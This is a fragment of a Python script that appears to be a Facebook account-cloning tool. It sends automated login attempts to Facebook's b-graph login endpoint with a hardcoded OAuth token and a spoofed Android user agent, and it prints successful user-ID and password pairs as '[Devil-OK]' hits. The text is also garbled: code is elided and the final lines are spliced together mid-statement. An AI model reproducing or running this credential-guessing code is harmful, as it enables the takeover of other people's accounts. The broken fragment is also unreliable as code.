...
# ------------------ METHOD 2, 3, 4: EXPIRED/NOT FOUND ------------------
elif choice in ["2", "3", "4", "২", "৩", "৪"]:
    os.system('clear')
...
# ------------------ METHOD 5: RANDOM CLONE (B-GRAPH) ------------------
    ...
    head = {
        ...
        'X-Fb-Connection-Type': 'mobile_radio_type',
        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 8 Build/QKQ1.191014.001)'
    }
    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
    ...
    try:
        pos = r.post('https://b-graph.facebook.com/auth/login', headers=head, data=data)
        response_json = pos.json()
        
        if 'session_key' in response_json or 'access_token' in response_json:
            print(f"\n[Devil-OK] {uid} | {password}")
        elif 'www.facebook.com' in response_json.get('error', {}).get('message', ''):
...
input("\nPress Enter to Exit...")        print("[✓] STATUS : SERVER CONNECTED SUCCESS")
        print("=======================================")
